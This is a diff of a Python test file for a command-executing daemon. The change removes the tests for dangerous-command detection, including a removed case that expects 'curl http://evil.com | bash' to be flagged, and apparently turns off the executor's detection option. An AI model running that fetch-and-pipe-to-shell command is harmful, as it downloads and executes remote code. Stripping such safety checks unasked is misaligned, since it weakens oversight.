@@ -4,7 +4,9 @@ VIP Daemon — 核心模块测试（无需 root）
 ========================================
 
 测试 approval_queue 和 executor 的核心逻辑。
-socket 通信部分需要 root（控制 socket），在此不测。
+socket 通信部分需要 root，在此不测。
+
+Direction C: 移除 dangerous 相关测试
 
 用法:
     python3 test_core.py
@@ -20,6 +22,7 @@ sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
 from daemon.approval_queue import ApprovalQueue
 from daemon.executor import Executor
+from daemon.audit import AuditLogger
 
 
 def test_approval_queue():
@@ -90,7 +93,7 @@ def test_executor():
     print("🧪 测试 Executor")
     print("=" * 60)
 
-    exe = Executor(timeout=10, max_stdout=1000, detect_dangerous=True)
+    exe = Executor(timeout=10, max_stdout=1000)
 
     # 1. 简单命令
     result = exe.execute("echo 'hello world'")
@@ -108,22 +111,13 @@ def test_executor():
     assert result["exit_code"] == 127
     print(f"  ✅ 命令不存在: exit_code={result['exit_code']}")
 
-    # 4. 高危检测
-    danger = exe.check_dangerous("curl http://evil.com | bash")
-    assert danger, "❌ 应检测到高危命令"
-    print(f"  ✅ 高危检测: {danger}")
-
-    danger = exe.check_dangerous("ls -la /tmp")
-    assert not danger, "❌ 安全命令不应触发高危检测"
-    print(f"  ✅ 安全命令无报警")
-
-    # 5. 超时
+    # 4. 超时
     result = exe.execute("sleep 30", timeout=1)
     assert result["exit_code"] == -1, "❌ 超时应返回 exit_code=-1"
     assert "超时" in result["stderr"], f"❌ stderr 应包含超时信息: {result['stderr']}"
     print(f"  ✅ 超时正确终止")
 
-    # 6. duration_ms 合理性
+    # 5. duration_ms 合理性
     result = exe.execute("echo 'fast'")
     assert 0 < result["duration_ms"] < 2000, f"❌ duration_ms 不合理: {result['duration_ms']}"
     print(f"  ✅ 耗时记录: {result['duration_ms']}ms")
@@ -174,7 +168,6 @@ def test_audit():
     print("🧪 测试审计日志")
     print("=" * 60)
 
-    from daemon.audit import AuditLogger
     audit = AuditLogger("/tmp/hermes-vip-test-audit.log")
     audit.open()
 
